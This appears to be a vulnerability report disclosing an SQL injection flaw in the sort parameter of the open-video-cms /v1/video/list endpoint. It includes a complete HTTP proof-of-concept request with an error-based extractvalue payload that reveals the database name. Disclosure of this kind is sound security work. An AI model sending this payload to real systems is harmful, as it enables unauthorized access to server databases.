# open-video-cms has sql injection vulnerability in video/list

## supplier 

https://github.com/realguoshuai/open-video-cms/blob/master/README.md

## Vulnerability file

/v1/video/list

## describe

The system there is sql inection vulnerability Via sort parameter .The parameters that can be controlled are as follows:  sort parameter . A attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

in VideoController.java

servler url

```
/v1/video/list
```

![Image](https://github.com/user-attachments/assets/ec7d55ce-08e8-4862-825f-2447615489e1)

and reflect to ViedeoMapper.xml

id = "listObjectByQuery"，sort can be control cause sql injection

![Image](https://github.com/user-attachments/assets/d0f6ee81-1524-40f0-9bbc-317755bc1ffa)

![Image](https://github.com/user-attachments/assets/460d3b87-b127-4bf3-ae09-ba560576d602)

## POC

```
GET /zy_video_war/v1/video/list?sort=extractvalue(1,concat(0x7e,database(),0x7e))%23&order=1 HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: collapase-nav=collapse-nav2
Connection: close

```

**Result**

get database name

![Image](https://github.com/user-attachments/assets/77e2caec-cf66-4522-a90b-0cd1ac00c666)
